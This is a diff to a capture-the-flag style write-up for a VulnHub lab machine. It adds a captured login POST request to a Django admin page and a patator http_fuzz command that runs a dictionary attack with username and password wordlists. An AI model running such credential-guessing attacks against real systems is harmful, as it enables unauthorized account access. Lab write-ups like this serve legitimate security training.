@@ -132,7 +132,30 @@ The reson for that was because in the real world we can found three main types o
 - email address (very common)
 - numeric ID (like SAP identifier, popular mostly as username for internal corporate services and networks)
 
-As third type was very unlikely here, I've focused on first and second. After couple of login attempts in the browser to identify valid HTTP request I will have to use as my payload, I decided to perform dictionary attack using  __patator__ and its __http_fuzz__ module (https://github.com/lanjelot/patator):
+As third type was very unlikely here, I've focused on first and second. After couple of login attempts in the browser to identify valid HTTP request I will have to use as my payload, I decided to perform dictionary attack using  __patator__ and its __http_fuzz__ module (https://github.com/lanjelot/patator).
+
+The HTTP request looks like example one:
+
+```
+POST /admin/login/?next=/admin/ HTTP/1.1
+Host: 192.168.1.158
+Content-Length: 101
+Cache-Control: max-age=0
+Origin: http://192.168.1.158
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3278.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://192.168.1.158/admin/login/?next=/admin/
+Accept-Encoding: gzip, deflate
+Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: csrftoken=qysK0WgpDaoRfbU2MH1Lqdrkjf9mD4xU
+Connection: close
+
+csrfmiddlewaretoken=qysK0WgpDaoRfbU2MH1Lqdrkjf9mD4xU&username=alan&password=password&next=%2Fadmin%2F
+```
+
+And here is corresponding ```patator``` command line syntax to perform the same requests in dictionary attack:
 
 ```
 ./patator.py http_fuzz url=http://192.168.1.158/admin/login/?next=/admin/ method=POST body='csrfmiddlewaretoken=qysK0WgpDaoRfbU2MH1Lqdrkjf9mD4xU&username=FILE0&password=FILE1&next=/admin/' 0=/Users/bl4de/playground/VulnHub/buldog-usernames.txt 1=/Users/bl4de/hacking/dictionaries/passwords_2454.txt header="Cookie: csrftoken=qysK0WgpDaoRfbU2MH1Lqdrkjf9mD4xU" -x ignore:fgrep="Please enter the correct username and password for a staff account."
